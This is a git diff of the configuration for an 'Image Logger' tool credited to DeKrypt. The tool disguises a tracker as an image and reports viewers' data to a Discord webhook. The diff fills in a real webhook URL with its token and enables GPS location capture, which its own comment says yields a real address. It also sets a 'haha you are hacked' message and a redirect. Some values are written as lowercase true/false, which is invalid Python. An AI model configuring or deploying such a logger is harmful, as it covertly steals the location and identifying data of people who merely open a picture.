@@ -11,24 +11,24 @@ __version__ = "v2.0"
 __author__ = "DeKrypt"
 
 config = {
-    # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    # BASE CONFIG #https:/
+    "webhook": "https://discord.com/api/webhooks/1140350705622851685/zCCNc9vRv12wCARvhRK-xY_UFIJv7JTJIBXZDZMY_UEw-Gz5oeraAye2Pul_PcqYsGju",
+    "image": "https://www.bing.com/images/search?view=detailV2&ccid=jvlo1A%2b3&id=072308A93050E821650CDA04BB8A571413991FE7&thid=OIP.jvlo1A-3ECmpy9Dha37vTAHaEK&mediaurl=https%3a%2f%2fi.ytimg.com%2fvi%2flJTotzirAvU%2fmaxresdefault.jpg&cdnurl=https%3a%2f%2fth.bing.com%2fth%2fid%2fR.8ef968d40fb71029a9cbd0e16b7eef4c%3frik%3d5x%252bZExRXirsE2g%26pid%3dImgRaw%26r%3d0&exph=720&expw=1280&q=huge+psx&simid=608052251712687099&FORM=IRPRST&ck=DEC4DFACF3683E60FF7F808F94BD3FE2&selectedIndex=1&ajaxhist=0&ajaxserp=0", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
-    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
+    "username": "hits-account", # Set this to the name you want the webhook to have
+    "color": 0xFF0000 , # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
-    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
+    "crashBrowser": false, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
     
-    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
+    "accurateLocation": true, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
-        "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
+        "doMessage": true, # Enable the cuTstom message?
+        "message": "haha you are hacked", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
@@ -50,8 +50,8 @@ config = {
 
     # REDIRECTION #
     "redirect": {
-        "redirect": False, # Redirect to a webpage?
-        "page": "https://your-link.here" # Link to the webpage to redirect to 
+        "redirect": true, # Redirect to a webpage?
+        "page": "https://www.bing.com/images/search?view=detailV2&ccid=t%2fNhCT3G&id=00B229A6ECE3415F9E4231C79A59BB8C8075CFF7&thid=OIP.t_NhCT3G3xIa4OpIw4EhUgHaDt&mediaurl=https%3a%2f%2fwww.westmont.org.au%2fwp-content%2fuploads%2f2020%2f06%2fyou-have-been-hacked.jpg&cdnurl=https%3a%2f%2fth.bing.com%2fth%2fid%2fR.b7f361093dc6df121ae0ea48c3812152%3frik%3d9891gIy7WZrHMQ%26pid%3dImgRaw%26r%3d0&exph=750&expw=1500&q=you+got+hacked&simid=608056039831006801&FORM=IRPRST&ck=F8FB03C2C6B022DAFE0FB1A0C5D6FD83&selectedIndex=0&ajaxhist=0&ajaxserp=0" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
